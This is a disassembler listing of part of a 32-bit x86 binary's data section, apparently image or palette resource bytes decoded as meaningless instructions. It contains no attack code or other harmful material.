  41d1e9:	aa                   	stos   %al,%es:(%edi)
  41d1ea:	d6                   	salc
  41d1eb:	00 18                	add    %bl,(%eax)
  41d1ed:	8e b5 00 21 b2 de    	mov    -0x214ddf00(%ebp),%?
  41d1f3:	00 29                	add    %ch,(%ecx)
  41d1f5:	b2 de                	mov    $0xde,%dl
  41d1f7:	00 29                	add    %ch,(%ecx)
  41d1f9:	ae                   	scas   %es:(%edi),%al
  41d1fa:	d6                   	salc
  41d1fb:	00 21                	add    %ah,(%ecx)
  41d1fd:	86 a5 00 39 be e7    	xchg   %ah,-0x1841c700(%ebp)
  41d203:	00 31                	add    %dh,(%ecx)
  41d205:	82 9c 00 4a ba de 00 	sbbb   $0x52,0xdeba4a(%eax,%eax,1)
  41d20c:	52 
  41d20d:	be de 00 5a be       	mov    $0xbe5a00de,%esi
  41d212:	de 00                	fiadds (%eax)
  41d214:	73 df                	jae    0x41d1f5
  41d216:	ff 00                	incl   (%eax)
  41d218:	7b df                	jnp    0x41d1f9
  41d21a:	ff 00                	incl   (%eax)
  41d21c:	84 cf                	test   %cl,%bh
  41d21e:	e7 00                	out    %eax,$0x0
  41d220:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41d221:	e3 f7                	jecxz  0x41d21a
  41d223:	00 ad df ef 00 bd    	add    %ch,-0x42ff1021(%ebp)
  41d229:	ef                   	out    %eax,(%dx)
  41d22a:	ff 00                	incl   (%eax)
  41d22c:	c6                   	(bad)
  41d22d:	eb f7                	jmp    0x41d226
  41d22f:	00 de                	add    %bl,%dh
  41d231:	f7 ff                	idiv   %edi
  41d233:	00 00                	add    %al,(%eax)
  41d235:	9a ce 00 00 92 c6 00 	lcall  $0xc6,$0x920000ce
  41d23c:	08 8e bd 00 10 a2    	or     %cl,-0x5defff43(%esi)
  41d242:	d6                   	salc
  41d243:	00 10                	add    %dl,(%eax)
  41d245:	9e                   	sahf
  41d246:	ce                   	into
  41d247:	00 10                	add    %dl,(%eax)
  41d249:	7d a5                	jge    0x41d1f0
  41d24b:	00 18                	add    %bl,(%eax)
  41d24d:	aa                   	stos   %al,%es:(%edi)
  41d24e:	de 00                	fiadds (%eax)
  41d250:	18 a6 d6 00 21 a6    	sbb    %ah,-0x59deff2a(%esi)
  41d256:	d6                   	salc
  41d257:	00 18                	add    %bl,(%eax)
  41d259:	79 9c                	jns    0x41d1f7
  41d25b:	00 21                	add    %ah,(%ecx)
  41d25d:	a2 ce 00 29 ae       	mov    %al,0xae2900ce
  41d262:	de 00                	fiadds (%eax)
  41d264:	21 8a ad 00 31 b6    	and    %ecx,-0x49ceff53(%edx)
  41d26a:	e7 00                	out    %eax,$0x0
  41d26c:	31 b2 de 00 39 b2    	xor    %esi,-0x4dc6ff22(%edx)
  41d272:	de 00                	fiadds (%eax)
  41d274:	42                   	inc    %edx
  41d275:	c3                   	ret
  41d276:	ef                   	out    %eax,(%dx)
  41d277:	00 29                	add    %ch,(%ecx)
  41d279:	79 94                	jns    0x41d20f
  41d27b:	00 42 b6             	add    %al,-0x4a(%edx)
  41d27e:	de 00                	fiadds (%eax)
  41d280:	4a                   	dec    %edx
  41d281:	c3                   	ret
  41d282:	ef                   	out    %eax,(%dx)
  41d283:	00 4a b6             	add    %cl,-0x4a(%edx)
  41d286:	de 00                	fiadds (%eax)
  41d288:	5a                   	pop    %edx
  41d289:	cf                   	iret
  41d28a:	f7 00 52 ba de 00    	testl  $0xdeba52,(%eax)
  41d290:	39 7d 94             	cmp    %edi,-0x6c(%ebp)
  41d293:	00 5a c3             	add    %bl,-0x3d(%edx)
  41d296:	e7 00                	out    %eax,$0x0
  41d298:	6b d7 ff             	imul   $0xffffffff,%edi,%edx
  41d29b:	00 6b d3             	add    %ch,-0x2d(%ebx)
  41d29e:	f7 00 63 be de 00    	testl  $0xdebe63,(%eax)
  41d2a4:	73 db                	jae    0x41d281
  41d2a6:	ff 00                	incl   (%eax)
  41d2a8:	6b c7 e7             	imul   $0xffffffe7,%edi,%eax
  41d2ab:	00 73 cf             	add    %dh,-0x31(%ebx)
  41d2ae:	ef                   	out    %eax,(%dx)
  41d2af:	00 7b cb             	add    %bh,-0x35(%ebx)
  41d2b2:	e7 00                	out    %eax,$0x0
  41d2b4:	84 d3                	test   %dl,%bl
  41d2b6:	ef                   	out    %eax,(%dx)
  41d2b7:	00 9c df f7 00 a5 e7 	add    %bl,-0x185aff09(%edi,%ebx,8)
  41d2be:	ff 00                	incl   (%eax)
  41d2c0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41d2c1:	db ef                	fucomi %st(7),%st
  41d2c3:	00 ef                	add    %ch,%bh
  41d2c5:	fb                   	sti
  41d2c6:	ff 00                	incl   (%eax)
  41d2c8:	21 aa de 00 29 aa    	and    %ebp,-0x55d6ff22(%edx)
  41d2ce:	de 00                	fiadds (%eax)
  41d2d0:	42                   	inc    %edx
  41d2d1:	b2 de                	mov    $0xde,%dl
  41d2d3:	00 52 c7             	add    %dl,-0x39(%edx)
  41d2d6:	f7 00 52 be e7 00    	testl  $0xe7be52,(%eax)
  41d2dc:	63 d3                	arpl   %edx,%ebx
  41d2de:	ff 00                	incl   (%eax)
  41d2e0:	5a                   	pop    %edx
  41d2e1:	be e7 00 63 c7       	mov    $0xc76300e7,%esi
  41d2e6:	ef                   	out    %eax,(%dx)
  41d2e7:	00 73 d7             	add    %dh,-0x29(%ebx)
  41d2ea:	ff 00                	incl   (%eax)
  41d2ec:	6b c3 e7             	imul   $0xffffffe7,%ebx,%eax
  41d2ef:	00 7b d3             	add    %bh,-0x2d(%ebx)
  41d2f2:	f7 00 84 d7 f7 00    	testl  $0xf7d784,(%eax)
  41d2f8:	8c d3                	mov    %ss,%ebx
  41d2fa:	ef                   	out    %eax,(%dx)
  41d2fb:	00 9c d7 ef 00 bd e7 	add    %bl,-0x1842ff11(%edi,%edx,8)
  41d302:	f7 00 c6 ef ff 00    	testl  $0xffefc6,(%eax)
  41d308:	d6                   	salc
  41d309:	f3 ff 00             	repz incl (%eax)
  41d30c:	63 cf                	arpl   %ecx,%edi
  41d30e:	ff 00                	incl   (%eax)
  41d310:	6b d3 ff             	imul   $0xffffffff,%ebx,%edx
  41d313:	00 9c db f7 00 b5 e3 	add    %bl,-0x1c4aff09(%ebx,%ebx,8)
  41d31a:	f7 00 4a be f7 00    	testl  $0xf7be4a,(%eax)
  41d320:	63 cb                	arpl   %ecx,%ebx
  41d322:	ff 00                	incl   (%eax)
  41d324:	94                   	xchg   %eax,%esp
  41d325:	d7                   	xlat   %ds:(%ebx)
  41d326:	f7 00 ad df f7 00    	testl  $0xf7dfad,(%eax)
  41d32c:	ce                   	into
  41d32d:	ef                   	out    %eax,(%dx)
  41d32e:	ff 00                	incl   (%eax)
  41d330:	e7 f7                	out    %eax,$0xf7
  41d332:	ff 00                	incl   (%eax)
  41d334:	bd e3 f7 00 de       	mov    $0xde00f7e3,%ebp
  41d339:	f3 ff 00             	repz incl (%eax)
  41d33c:	d6                   	salc
  41d33d:	ef                   	out    %eax,(%dx)
  41d33e:	ff 00                	incl   (%eax)
  41d340:	ef                   	out    %eax,(%dx)
  41d341:	f7 ff                	idiv   %edi
  41d343:	00 f7                	add    %dh,%bh
  41d345:	fb                   	sti
  41d346:	ff 00                	incl   (%eax)
  41d348:	ff                   	(bad)
  41d349:	ff                   	(bad)
  41d34a:	ff 00                	incl   (%eax)
	...
  41d5f0:	6c                   	insb   (%dx),%es:(%edi)
  41d5f1:	6c                   	insb   (%dx),%es:(%edi)
  41d5f2:	6c                   	insb   (%dx),%es:(%edi)
  41d5f3:	6c                   	insb   (%dx),%es:(%edi)
  41d5f4:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d61d:	00 00                	add    %al,(%eax)
  41d61f:	5b                   	pop    %ebx
  41d620:	71 7e                	jno    0x41d6a0
  41d622:	62 5b 46             	bound  %ebx,0x46(%ebx)
  41d625:	6c                   	insb   (%dx),%es:(%edi)
  41d626:	6c                   	insb   (%dx),%es:(%edi)
  41d627:	6c                   	insb   (%dx),%es:(%edi)
  41d628:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d64d:	00 00                	add    %al,(%eax)
  41d64f:	5b                   	pop    %ebx
  41d650:	63 7d 92             	arpl   %edi,-0x6e(%ebp)
  41d653:	96                   	xchg   %eax,%esi
  41d654:	83 68 61 5b          	subl   $0x5b,0x61(%eax)
  41d658:	5d                   	pop    %ebp
  41d659:	64 6c                	fs insb (%dx),%es:(%edi)
  41d65b:	6c                   	insb   (%dx),%es:(%edi)
  41d65c:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d67d:	00 00                	add    %al,(%eax)
  41d67f:	5b                   	pop    %ebx
  41d680:	66 7d 92             	data16 jge 0x41d615
  41d683:	92                   	xchg   %eax,%edx
  41d684:	91                   	xchg   %eax,%ecx
  41d685:	91                   	xchg   %eax,%ecx
  41d686:	91                   	xchg   %eax,%ecx
  41d687:	91                   	xchg   %eax,%ecx
  41d688:	91                   	xchg   %eax,%ecx
  41d689:	6e                   	outsb  %ds:(%esi),(%dx)
  41d68a:	4b                   	dec    %ebx
  41d68b:	42                   	inc    %edx
  41d68c:	5c                   	pop    %esp
  41d68d:	60                   	pusha
  41d68e:	6c                   	insb   (%dx),%es:(%edi)
  41d68f:	6c                   	insb   (%dx),%es:(%edi)
  41d690:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d6ad:	00 00                	add    %al,(%eax)
  41d6af:	5b                   	pop    %ebx
  41d6b0:	66 7d 74             	data16 jge 0x41d727
  41d6b3:	74 74                	je     0x41d729
  41d6b5:	74 74                	je     0x41d72b
  41d6b7:	74 74                	je     0x41d72d
  41d6b9:	74 74                	je     0x41d72f
  41d6bb:	74 85                	je     0x41d642
  41d6bd:	6e                   	outsb  %ds:(%esi),(%dx)
  41d6be:	4b                   	dec    %ebx
  41d6bf:	47                   	inc    %edi
  41d6c0:	5b                   	pop    %ebx
  41d6c1:	6c                   	insb   (%dx),%es:(%edi)
  41d6c2:	6c                   	insb   (%dx),%es:(%edi)
  41d6c3:	6c                   	insb   (%dx),%es:(%edi)
  41d6c4:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d6dd:	00 00                	add    %al,(%eax)
  41d6df:	5b                   	pop    %ebx
  41d6e0:	80 40 88 88          	addb   $0x88,-0x78(%eax)
  41d6e4:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  41d6ea:	88 88 88 88 53 53    	mov    %cl,0x53538888(%eax)
  41d6f0:	74 83                	je     0x41d675
  41d6f2:	68 61 5b 6c 6c       	push   $0x6c6c5b61
  41d6f7:	6c                   	insb   (%dx),%es:(%edi)
  41d6f8:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d70d:	00 00                	add    %al,(%eax)
  41d70f:	5b                   	pop    %ebx
  41d710:	80 58 77 77          	sbbb   $0x77,0x77(%eax)
  41d714:	77 77                	ja     0x41d78d
  41d716:	77 77                	ja     0x41d78f
  41d718:	77 77                	ja     0x41d791
  41d71a:	77 77                	ja     0x41d793
  41d71c:	77 77                	ja     0x41d795
  41d71e:	77 77                	ja     0x41d797
  41d720:	53                   	push   %ebx
  41d721:	53                   	push   %ebx
  41d722:	53                   	push   %ebx
  41d723:	54                   	push   %esp
  41d724:	54                   	push   %esp
  41d725:	70 4e                	jo     0x41d775
  41d727:	4a                   	dec    %edx
  41d728:	42                   	inc    %edx
  41d729:	6c                   	insb   (%dx),%es:(%edi)
  41d72a:	6c                   	insb   (%dx),%es:(%edi)
  41d72b:	6c                   	insb   (%dx),%es:(%edi)
  41d72c:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d73d:	00 00                	add    %al,(%eax)
  41d73f:	5b                   	pop    %ebx
  41d740:	80 8f 53 53 53 53 53 	orb    $0x53,0x53535353(%edi)
  41d747:	53                   	push   %ebx
  41d748:	53                   	push   %ebx
  41d749:	53                   	push   %ebx
  41d74a:	53                   	push   %ebx
  41d74b:	53                   	push   %ebx
  41d74c:	53                   	push   %ebx
  41d74d:	53                   	push   %ebx
  41d74e:	53                   	push   %ebx
  41d74f:	53                   	push   %ebx
  41d750:	54                   	push   %esp
  41d751:	54                   	push   %esp
  41d752:	54                   	push   %esp
  41d753:	54                   	push   %esp
  41d754:	54                   	push   %esp
  41d755:	54                   	push   %esp
  41d756:	54                   	push   %esp
  41d757:	54                   	push   %esp
  41d758:	54                   	push   %esp
  41d759:	3a 6b 4b             	cmp    0x4b(%ebx),%ch
  41d75c:	5e                   	pop    %esi
  41d75d:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d76e:	00 5b 80             	add    %bl,-0x80(%ebx)
  41d771:	8f                   	(bad)
  41d772:	3c 3c                	cmp    $0x3c,%al
  41d774:	3c 3c                	cmp    $0x3c,%al
  41d776:	3c 3c                	cmp    $0x3c,%al
  41d778:	3c 3c                	cmp    $0x3c,%al
  41d77a:	3c 3c                	cmp    $0x3c,%al
  41d77c:	3c 3c                	cmp    $0x3c,%al
  41d77e:	3c 3c                	cmp    $0x3c,%al
  41d780:	3c 3c                	cmp    $0x3c,%al
  41d782:	3c 3c                	cmp    $0x3c,%al
  41d784:	3c 3c                	cmp    $0x3c,%al
  41d786:	3c 3c                	cmp    $0x3c,%al
  41d788:	3c 3c                	cmp    $0x3c,%al
  41d78a:	3c 3c                	cmp    $0x3c,%al
  41d78c:	75 39                	jne    0x41d7c7
  41d78e:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d79f:	5b                   	pop    %ebx
  41d7a0:	80 41 3e 3c          	addb   $0x3c,0x3e(%ecx)
  41d7a4:	3c 3c                	cmp    $0x3c,%al
  41d7a6:	3c 3c                	cmp    $0x3c,%al
  41d7a8:	3c 3c                	cmp    $0x3c,%al
  41d7aa:	3c 3c                	cmp    $0x3c,%al
  41d7ac:	3c 3c                	cmp    $0x3c,%al
  41d7ae:	3c 3c                	cmp    $0x3c,%al
  41d7b0:	3c 3c                	cmp    $0x3c,%al
  41d7b2:	3c 3c                	cmp    $0x3c,%al
  41d7b4:	3c 3c                	cmp    $0x3c,%al
  41d7b6:	3c 3c                	cmp    $0x3c,%al
  41d7b8:	3c 3c                	cmp    $0x3c,%al
  41d7ba:	3c 3c                	cmp    $0x3c,%al
  41d7bc:	3c 95                	cmp    $0x95,%al
  41d7be:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d7cf:	5b                   	pop    %ebx
  41d7d0:	80 56 32 31          	adcb   $0x31,0x32(%esi)
  41d7d4:	31 31                	xor    %esi,(%ecx)
  41d7d6:	31 31                	xor    %esi,(%ecx)
  41d7d8:	31 31                	xor    %esi,(%ecx)
  41d7da:	31 31                	xor    %esi,(%ecx)
  41d7dc:	31 31                	xor    %esi,(%ecx)
  41d7de:	31 31                	xor    %esi,(%ecx)
  41d7e0:	31 31                	xor    %esi,(%ecx)
  41d7e2:	31 31                	xor    %esi,(%ecx)
  41d7e4:	31 31                	xor    %esi,(%ecx)
  41d7e6:	31 31                	xor    %esi,(%ecx)
  41d7e8:	31 31                	xor    %esi,(%ecx)
  41d7ea:	31 31                	xor    %esi,(%ecx)
  41d7ec:	31 95 6c 00 00 00    	xor    %edx,0x6c(%ebp)
	...
  41d7fe:	5b                   	pop    %ebx
  41d7ff:	80 80 93 32 28 28 28 	addb   $0x28,0x28283293(%eax)
  41d806:	28 28                	sub    %ch,(%eax)
  41d808:	28 28                	sub    %ch,(%eax)
  41d80a:	28 28                	sub    %ch,(%eax)
  41d80c:	28 28                	sub    %ch,(%eax)
  41d80e:	28 28                	sub    %ch,(%eax)
  41d810:	28 28                	sub    %ch,(%eax)
  41d812:	28 28                	sub    %ch,(%eax)
  41d814:	28 28                	sub    %ch,(%eax)
  41d816:	28 28                	sub    %ch,(%eax)
  41d818:	28 28                	sub    %ch,(%eax)
  41d81a:	28 28                	sub    %ch,(%eax)
  41d81c:	28 91 5b 6c 00 00    	sub    %dl,0x6c5b(%ecx)
	...
  41d82e:	5b                   	pop    %ebx
  41d82f:	80 80 93 29 1d 1d 1d 	addb   $0x1d,0x1d1d2993(%eax)
  41d836:	1d 1d 1d 1d 1d       	sbb    $0x1d1d1d1d,%eax
  41d83b:	1d 1d 1d 1d 1d       	sbb    $0x1d1d1d1d,%eax
  41d840:	1d 1d 1d 1d 1d       	sbb    $0x1d1d1d1d,%eax
  41d845:	1d 1d 1d 1d 1d       	sbb    $0x1d1d1d1d,%eax
  41d84a:	1d 1d 1d 91 5b       	sbb    $0x5b911d1d,%eax
  41d84f:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d85c:	00 00                	add    %al,(%eax)
  41d85e:	5b                   	pop    %ebx
  41d85f:	80 80 7c 25 23 23 23 	addb   $0x23,0x2323257c(%eax)
  41d866:	23 23                	and    (%ebx),%esp
  41d868:	23 23                	and    (%ebx),%esp
  41d86a:	23 23                	and    (%ebx),%esp
  41d86c:	23 23                	and    (%ebx),%esp
  41d86e:	23 23                	and    (%ebx),%esp
  41d870:	23 23                	and    (%ebx),%esp
  41d872:	23 23                	and    (%ebx),%esp
  41d874:	23 23                	and    (%ebx),%esp
  41d876:	23 23                	and    (%ebx),%esp
  41d878:	23 23                	and    (%ebx),%esp
  41d87a:	23 23                	and    (%ebx),%esp
  41d87c:	23 91 4b 6c 00 00    	and    0x6c4b(%ecx),%edx
	...
  41d88e:	5b                   	pop    %ebx
  41d88f:	81 81 79 2b 17 17 17 	addl   $0x17171717,0x17172b79(%ecx)
  41d896:	17 17 17 
  41d899:	17                   	pop    %ss
  41d89a:	17                   	pop    %ss
  41d89b:	17                   	pop    %ss
  41d89c:	17                   	pop    %ss
  41d89d:	17                   	pop    %ss
  41d89e:	17                   	pop    %ss
  41d89f:	17                   	pop    %ss
  41d8a0:	17                   	pop    %ss
  41d8a1:	17                   	pop    %ss
  41d8a2:	17                   	pop    %ss
  41d8a3:	17                   	pop    %ss
  41d8a4:	17                   	pop    %ss
  41d8a5:	17                   	pop    %ss
  41d8a6:	17                   	pop    %ss
  41d8a7:	17                   	pop    %ss
  41d8a8:	17                   	pop    %ss
  41d8a9:	17                   	pop    %ss
  41d8aa:	17                   	pop    %ss
  41d8ab:	17                   	pop    %ss
  41d8ac:	17                   	pop    %ss
  41d8ad:	91                   	xchg   %eax,%ecx
  41d8ae:	4b                   	dec    %ebx
  41d8af:	6c                   	insb   (%dx),%es:(%edi)
	...
  41d8bc:	00 00                	add    %al,(%eax)
  41d8be:	5b                   	pop    %ebx
  41d8bf:	69 69 78 1a 13 13 13 	imul   $0x1313131a,0x78(%ecx),%ebp
  41d8c6:	13 13                	adc    (%ebx),%edx
  41d8c8:	13 13                	adc    (%ebx),%edx
  41d8ca:	13 13                	adc    (%ebx),%edx
  41d8cc:	13 13                	adc    (%ebx),%edx
  41d8ce:	13 13                	adc    (%ebx),%edx
  41d8d0:	13 13                	adc    (%ebx),%edx
  41d8d2:	13 13                	adc    (%ebx),%edx
  41d8d4:	13 13                	adc    (%ebx),%edx
  41d8d6:	13 13                	adc    (%ebx),%edx
  41d8d8:	13 13                	adc    (%ebx),%edx
  41d8da:	13 13                	adc    (%ebx),%edx
  41d8dc:	13 91 26 4f 00 00    	adc    0x4f26(%ecx),%edx
	...
  41d8ee:	5b                   	pop    %ebx
  41d8ef:	84 84 78 1a 10 10 10 	test   %al,0x1010101a(%eax,%edi,2)
  41d8f6:	10 10                	adc    %dl,(%eax)
  41d8f8:	10 10                	adc    %dl,(%eax)
  41d8fa:	10 10                	adc    %dl,(%eax)
  41d8fc:	10 10                	adc    %dl,(%eax)
  41d8fe:	10 10                	adc    %dl,(%eax)
  41d900:	10 10                	adc    %dl,(%eax)
  41d902:	10 10                	adc    %dl,(%eax)
  41d904:	10 10                	adc    %dl,(%eax)
  41d906:	10 10                	adc    %dl,(%eax)
  41d908:	10 10                	adc    %dl,(%eax)
  41d90a:	10 10                	adc    %dl,(%eax)
  41d90c:	10 91 3b 4d 6c 00    	adc    %dl,0x6c4d3b(%ecx)
	...
  41d91e:	5b                   	pop    %ebx
  41d91f:	84 84 78 2c 10 10 10 	test   %al,0x1010102c(%eax,%edi,2)
  41d926:	10 10                	adc    %dl,(%eax)
  41d928:	10 10                	adc    %dl,(%eax)
  41d92a:	10 10                	adc    %dl,(%eax)
  41d92c:	10 10                	adc    %dl,(%eax)
  41d92e:	10 10                	adc    %dl,(%eax)
  41d930:	10 10                	adc    %dl,(%eax)
  41d932:	10 10                	adc    %dl,(%eax)
  41d934:	10 10                	adc    %dl,(%eax)
  41d936:	10 10                	adc    %dl,(%eax)
  41d938:	10 10                	adc    %dl,(%eax)
  41d93a:	10 10                	adc    %dl,(%eax)
  41d93c:	10 91 24 49 6c 00    	adc    %dl,0x6c4924(%ecx)
	...
  41d94e:	5b                   	pop    %ebx
  41d94f:	86 86 6d 15 03 03    	xchg   %al,0x303156d(%esi)
  41d955:	03 03                	add    (%ebx),%eax
  41d957:	03 03                	add    (%ebx),%eax
  41d959:	03 03                	add    (%ebx),%eax
  41d95b:	03 03                	add    (%ebx),%eax
  41d95d:	03 03                	add    (%ebx),%eax
  41d95f:	03 03                	add    (%ebx),%eax
  41d961:	03 03                	add    (%ebx),%eax
  41d963:	03 03                	add    (%ebx),%eax
  41d965:	03 03                	add    (%ebx),%eax
  41d967:	03 03                	add    (%ebx),%eax
  41d969:	03 03                	add    (%ebx),%eax
  41d96b:	03 03                	add    (%ebx),%eax
  41d96d:	91                   	xchg   %eax,%ecx
  41d96e:	18 45 6c             	sbb    %al,0x6c(%ebp)
	...
  41d97d:	00 5b 73             	add    %bl,0x73(%ebx)
  41d980:	87 6a 1b             	xchg   %ebp,0x1b(%edx)
  41d983:	03 03                	add    (%ebx),%eax
  41d985:	03 03                	add    (%ebx),%eax
  41d987:	03 03                	add    (%ebx),%eax
  41d989:	03 03                	add    (%ebx),%eax
  41d98b:	03 03                	add    (%ebx),%eax
  41d98d:	03 03                	add    (%ebx),%eax
  41d98f:	03 03                	add    (%ebx),%eax
  41d991:	03 03                	add    (%ebx),%eax
  41d993:	03 03                	add    (%ebx),%eax
  41d995:	03 03                	add    (%ebx),%eax
  41d997:	03 03                	add    (%ebx),%eax
  41d999:	03 03                	add    (%ebx),%eax
  41d99b:	03 03                	add    (%ebx),%eax
  41d99d:	91                   	xchg   %eax,%ecx
  41d99e:	09 5b 6c             	or     %ebx,0x6c(%ebx)
	...
  41d9ad:	00 5b 7b             	add    %bl,0x7b(%ebx)
  41d9b0:	8a 6a 1b             	mov    0x1b(%edx),%ch
  41d9b3:	04 04                	add    $0x4,%al
  41d9b5:	04 04                	add    $0x4,%al
  41d9b7:	04 04                	add    $0x4,%al
  41d9b9:	04 04                	add    $0x4,%al
  41d9bb:	04 04                	add    $0x4,%al
  41d9bd:	04 04                	add    $0x4,%al
  41d9bf:	04 04                	add    $0x4,%al
  41d9c1:	04 04                	add    $0x4,%al
  41d9c3:	04 04                	add    $0x4,%al
  41d9c5:	04 04                	add    $0x4,%al
  41d9c7:	04 04                	add    $0x4,%al
  41d9c9:	04 04                	add    $0x4,%al
  41d9cb:	04 04                	add    $0x4,%al
  41d9cd:	91                   	xchg   %eax,%ecx
  41d9ce:	09 44 6c 00          	or     %eax,0x0(%esp,%ebp,2)
	...
  41d9de:	5b                   	pop    %ebx
  41d9df:	97                   	xchg   %eax,%edi
  41d9e0:	8a 44 2d 05          	mov    0x5(%ebp,%ebp,1),%al
  41d9e4:	05 05 05 05 05       	add    $0x5050505,%eax
  41d9e9:	05 05 05 05 05       	add    $0x5050505,%eax
  41d9ee:	05 05 05 05 05       	add    $0x5050505,%eax
  41d9f3:	05 05 05 05 05       	add    $0x5050505,%eax
  41d9f8:	05 05 05 05 05       	add    $0x5050505,%eax
  41d9fd:	91                   	xchg   %eax,%ecx
  41d9fe:	0a 69 6c             	or     0x6c(%ecx),%ch
	...
  41da0d:	00 5b 97             	add    %bl,-0x69(%ebx)
  41da10:	8b 44 7f 09          	mov    0x9(%edi,%edi,2),%eax
  41da14:	07                   	pop    %es
  41da15:	06                   	push   %es
  41da16:	06                   	push   %es
  41da17:	06                   	push   %es
  41da18:	06                   	push   %es
  41da19:	06                   	push   %es
  41da1a:	06                   	push   %es
  41da1b:	06                   	push   %es
  41da1c:	06                   	push   %es
  41da1d:	06                   	push   %es
  41da1e:	06                   	push   %es
  41da1f:	06                   	push   %es
  41da20:	06                   	push   %es
  41da21:	06                   	push   %es
  41da22:	06                   	push   %es
  41da23:	06                   	push   %es
  41da24:	06                   	push   %es
  41da25:	06                   	push   %es
  41da26:	06                   	push   %es
  41da27:	06                   	push   %es
  41da28:	06                   	push   %es
  41da29:	06                   	push   %es
  41da2a:	06                   	push   %es
  41da2b:	06                   	push   %es
  41da2c:	06                   	push   %es
  41da2d:	91                   	xchg   %eax,%ecx
  41da2e:	0b 51 72             	or     0x72(%ecx),%edx
	...
  41da3d:	00 5b 93             	add    %bl,-0x6d(%ebx)
  41da40:	2a 44 52 99          	sub    -0x67(%edx,%edx,2),%al
  41da44:	7f 7f                	jg     0x41dac5
  41da46:	2d 1f 1b 09 09       	sub    $0x9091b1f,%eax
  41da4b:	08 07                	or     %al,(%edi)
  41da4d:	07                   	pop    %es
  41da4e:	07                   	pop    %es
  41da4f:	07                   	pop    %es
  41da50:	07                   	pop    %es
  41da51:	07                   	pop    %es
  41da52:	07                   	pop    %es
  41da53:	07                   	pop    %es
  41da54:	07                   	pop    %es
  41da55:	07                   	pop    %es
  41da56:	07                   	pop    %es
  41da57:	07                   	pop    %es
  41da58:	07                   	pop    %es
  41da59:	07                   	pop    %es
  41da5a:	07                   	pop    %es
  41da5b:	07                   	pop    %es
  41da5c:	07                   	pop    %es
  41da5d:	91                   	xchg   %eax,%ecx
  41da5e:	0b 30                	or     (%eax),%esi
  41da60:	4f                   	dec    %edi
  41da61:	6c                   	insb   (%dx),%es:(%edi)
	...
  41da6e:	5b                   	pop    %ebx
  41da6f:	98                   	cwtl
  41da70:	2a 27                	sub    (%edi),%ah
  41da72:	35 5b 44 6a 89       	xor    $0x896a445b,%eax
  41da77:	7b 94                	jnp    0x41da0d
  41da79:	9a 7f 7f 2d 08 08 08 	lcall  $0x808,$0x82d7f7f
  41da80:	08 08                	or     %cl,(%eax)
  41da82:	08 08                	or     %cl,(%eax)
  41da84:	08 08                	or     %cl,(%eax)
  41da86:	08 08                	or     %cl,(%eax)
  41da88:	08 08                	or     %cl,(%eax)
  41da8a:	08 08                	or     %cl,(%eax)
  41da8c:	08 91 0c 33 67 6c    	or     %dl,0x6c67330c(%ecx)
	...
  41da9e:	5b                   	pop    %ebx
  41da9f:	90                   	nop
  41daa0:	1e                   	push   %ds
  41daa1:	17                   	pop    %ss
  41daa2:	17                   	pop    %ss
  41daa3:	17                   	pop    %ss
  41daa4:	22 27                	and    (%edi),%ah
  41daa6:	2f                   	das
  41daa7:	35 48 5b 44 50       	xor    $0x50445b48,%eax
  41daac:	59                   	pop    %ecx
  41daad:	0d 0a 09 09 09       	or     $0x909090a,%eax
  41dab2:	09 09                	or     %ecx,(%ecx)
  41dab4:	09 09                	or     %ecx,(%ecx)
  41dab6:	09 09                	or     %ecx,(%ecx)
  41dab8:	09 09                	or     %ecx,(%ecx)
  41daba:	09 09                	or     %ecx,(%ecx)
  41dabc:	09 91 0d 3f 49 6c    	or     %edx,0x6c493f0d(%ecx)
	...
  41dace:	5b                   	pop    %ebx
  41dacf:	90                   	nop
  41dad0:	19 10                	sbb    %edx,(%eax)
  41dad2:	10 10                	adc    %dl,(%eax)
  41dad4:	10 10                	adc    %dl,(%eax)
  41dad6:	10 10                	adc    %dl,(%eax)
  41dad8:	10 10                	adc    %dl,(%eax)
  41dada:	1c 38                	sbb    $0x38,%al
  41dadc:	44                   	inc    %esp
  41dadd:	59                   	pop    %ecx
  41dade:	0d 0b 0b 0b 0b       	or     $0xb0b0b0b,%eax
  41dae3:	0b 0b                	or     (%ebx),%ecx
  41dae5:	0b 0b                	or     (%ebx),%ecx
  41dae7:	0b 0b                	or     (%ebx),%ecx
  41dae9:	0b 0b                	or     (%ebx),%ecx
  41daeb:	0b 0b                	or     (%ebx),%ecx
  41daed:	91                   	xchg   %eax,%ecx
  41daee:	0d 90 43 6c 00       	or     $0x6c4390,%eax
	...
  41dafb:	00 00                	add    %al,(%eax)
  41dafd:	00 5b 5a             	add    %bl,0x5a(%ebx)
  41db00:	11 03                	adc    %eax,(%ebx)
  41db02:	03 03                	add    (%ebx),%eax
  41db04:	03 03                	add    (%ebx),%eax
  41db06:	03 03                	add    (%ebx),%eax
  41db08:	03 03                	add    (%ebx),%eax
  41db0a:	03 03                	add    (%ebx),%eax
  41db0c:	2f                   	das
  41db0d:	44                   	inc    %esp
  41db0e:	9e                   	sahf
  41db0f:	0e                   	push   %cs
  41db10:	0e                   	push   %cs
  41db11:	0d 0d 0c 0c 0c       	or     $0xc0c0c0d,%eax
  41db16:	0c 0c                	or     $0xc,%al
  41db18:	0c 0c                	or     $0xc,%al
  41db1a:	0c 0c                	or     $0xc,%al
  41db1c:	0c 91                	or     $0x91,%al
  41db1e:	0e                   	push   %cs
  41db1f:	0e                   	push   %cs
  41db20:	5b                   	pop    %ebx
  41db21:	6c                   	insb   (%dx),%es:(%edi)
	...
  41db2e:	5b                   	pop    %ebx
  41db2f:	9a 05 03 03 03 03 03 	lcall  $0x303,$0x3030305
  41db36:	03 03                	add    (%ebx),%eax
  41db38:	03 03                	add    (%ebx),%eax
  41db3a:	03 03                	add    (%ebx),%eax
  41db3c:	03 2e                	add    (%esi),%ebp
  41db3e:	5f                   	pop    %edi
  41db3f:	6a 3d                	push   $0x3d
  41db41:	8c 8e 9c 01 01 0e    	mov    %cs,0xe01019c(%esi)
  41db47:	0e                   	push   %cs
